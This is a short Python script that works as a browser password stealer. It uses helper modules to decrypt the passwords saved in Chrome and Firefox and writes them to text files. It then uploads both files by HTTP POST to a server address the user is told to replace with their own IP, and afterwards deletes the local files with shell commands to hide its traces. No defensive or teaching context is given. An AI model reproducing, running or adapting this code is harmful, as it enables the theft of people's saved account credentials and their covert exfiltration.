try:
    import firefox_decrypt
except TypeError:
    print('You need to use Python 3.9.')
    exit()
import decrypt_chrome_password

import requests
import os

try:
    decrypt_chrome_password.main()
    print("'chrome_passwords.txt' ready")
except:
    print("Couldn't retrieve Chrome passwords.\nTrying with Firefox instead.")

try:
    firefox_decrypt.main()
    print("'firefox_passwords.txt' ready")
except:
    print("Couldn't retrieve Firefox passwords.")


url= 'http://localhost:5000/data/' # REPLACE THIS WITH 'http://YOUR_SERVER_IP/data/'

def find():
    try:
        files={'file1': open('chrome_passwords.txt', 'r'), 'file2': open('firefox_passwords.txt', 'r')}
        return files
    except:
        print("Couldn't get both files. Aborting.")
        exit()

files=find()

text='Data sent.'
data={'Field1_name' : text}
try:
    requests.post(url, data=data, files=files)
    print('Data sent.')
except:
    print('Server is off.')

files['file1'].close()
files['file2'].close()
os.system('del chrome_passwords.txt')
os.system('del firefox_passwords.txt')